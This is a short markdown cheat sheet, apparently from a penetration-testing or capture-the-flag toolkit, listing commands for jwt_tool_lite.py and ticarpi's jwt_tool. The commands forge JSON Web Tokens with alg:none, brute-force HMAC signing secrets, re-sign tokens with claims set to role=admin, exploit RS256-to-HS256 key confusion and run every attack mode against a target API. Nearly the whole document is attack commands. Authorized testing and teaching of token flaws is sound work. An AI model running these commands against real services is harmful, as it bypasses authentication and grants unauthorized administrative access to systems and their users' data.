# jwt_tool & jwt_tool_lite.py

## Our script (no deps): `scripts/auth/jwt_tool_lite.py`
```bash
python scripts/auth/jwt_tool_lite.py decode <jwt>
python scripts/auth/jwt_tool_lite.py none   <jwt> --set role=admin --set partner=admin [--variant None]
python scripts/auth/jwt_tool_lite.py crack  <jwt> --digits 4            # numeric keyspace
python scripts/auth/jwt_tool_lite.py crack  <jwt> -w wordlists/secrets/jwt-secrets.txt
python scripts/auth/jwt_tool_lite.py sign   <jwt> --secret 1234 --set role=admin [--alg HS256]
```
`--set k=v` edits claims (values `true/false/123/null` are typed; `--set-str` forces string).

## jwt_tool (ticarpi) — full featured
`git clone https://github.com/ticarpi/jwt_tool && pip install -r requirements.txt`
```bash
python jwt_tool.py <jwt>                                   # decode
python jwt_tool.py <jwt> -X a                              # alg:none variants
python jwt_tool.py <jwt> -C -d wordlists/secrets/jwt-secrets.txt     # crack HMAC
python jwt_tool.py <jwt> -T                                # tamper interactively
python jwt_tool.py <jwt> -S hs256 -p 'secret' -I -pc role -pv admin  # inject claim + sign
python jwt_tool.py <jwt> -X k -pk public.pem               # RS256→HS256 key confusion
python jwt_tool.py -t "$T/api" -rh "Authorization: Bearer <jwt>" -M at   # scan all attacks vs target
```
Also: jwt.io (decode in browser), Burp "JWT Editor" extension, hashcat `-m 16500`.
